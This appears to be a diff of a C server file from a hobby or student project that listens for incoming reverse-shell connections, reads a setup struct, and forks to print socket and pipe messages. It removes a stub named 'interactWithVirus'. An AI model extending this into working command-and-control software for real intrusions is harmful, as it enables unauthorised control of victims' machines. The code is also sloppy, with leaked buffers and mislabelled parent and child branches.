@@ -23,54 +23,39 @@
 #include "server.h"
 #include "init_struct.h"
 
-#define SIZE 100
 
-int listening_server_action(int new_socket){
+
+int listening_server_action(int new_socket, int readPipe){
   printf("ready to take command of the new reverse shell that just connected...\n");
+
   struct init_struct init;
   read(new_socket, &init, sizeof(struct  init_struct));
   printf("RECIEVED CONNECTION!...\n");
   print_init_struct(&init);
+  int fds[2];
+  pipe(fds);
 
-  int * childFds = (int*)malloc(SIZE * sizeof(int));
-  int idCount = 0;
+  int forkResult = fork();
 
-  while(1){
-    // This will eventually be some sort of struct
-    // Reading the socket
-    char connection[1024] = "";
-    int bytes;
-    while(bytes = read(new_socket, connection, 1024)){
-      printf("\n<<CONNECTION>> : %s\n", connection);
-      memset(connection, 0, sizeof(connection));
-      
-      int fds[2];
-      pipe(fds);
-
-      int forkResult = fork();
-      if (forkResult == -1) err();
-
-      // If parent, add writePipe to childfds, go back to listening for connections
-      if (forkResult > 0){
-        close(fds[0]);
-        childFds[idCount] = fds[1];
-	idCount++;
-      }
-
-      // If child, call child program with childID, read pipe to read from parent
-      else {
-        close(fds[1]);
-	int childID = idCount;
-        interactWithVirus(childID, fds[0]);
-        return 0;
+// If parent, read from listening server and write to socket
+  if (forkResult == 0){
+    while (1){
+      int messageLength = 2048;
+      char * message = malloc(messageLength * sizeof(char));
+      int readResult = read(readPipe, message, messageLength);
+      printf("message: %s\n", message);
+    }
+  }
+  // If child, just read from socket
+  else {
+    while(1){
+      char connection[1024] = "";
+      int bytes;
+      while(bytes = read(new_socket, connection, 1024)){
+        printf("\n<<CONNECTION>> : %s\n", connection);
+        memset(connection, 0, sizeof(connection));
       }
     }
   }
-
-  free (childFds);
-  return 0;
-}
-
-int interactWithVirus(int childID, int readPipe){
   return 0;
 }
